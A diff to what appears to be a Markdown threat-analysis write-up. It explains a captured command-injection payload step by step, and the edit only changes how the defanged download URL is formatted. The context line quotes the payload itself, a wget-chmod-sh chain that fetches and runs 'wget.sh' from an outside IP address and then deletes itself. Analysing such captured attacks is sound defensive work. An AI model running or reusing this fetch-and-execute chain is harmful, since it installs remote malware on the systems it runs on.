@@ -55,7 +55,7 @@ cd && cd tmp && export PATH=$PATH:. && cd /tmp;wget http://23.94.22[.]13/a/wget.
 This looks like a rather simple command injection.
 - It does a CD (change directory) and if that executes with no errors it changes directory to the tmp directory.
 - Then adds the current path to the PATH variable
-- We see a CD to the /tmp directory where it then uses the wget tool to pull down a script titled "wget.sh" from http://23.94.22[.]13/a/wget.sh
+- We see a CD to the /tmp directory where it then uses the wget tool to pull down a script titled "wget.sh" from ```http://23[.]94.22[.]13/a/wget.sh```
 - It then changed the permissions on the wget.sh script to 777 or rwxrwxrwx 
 - We then see it use sh to execute wget.sh and it follows it all up by deleting itself. 
 
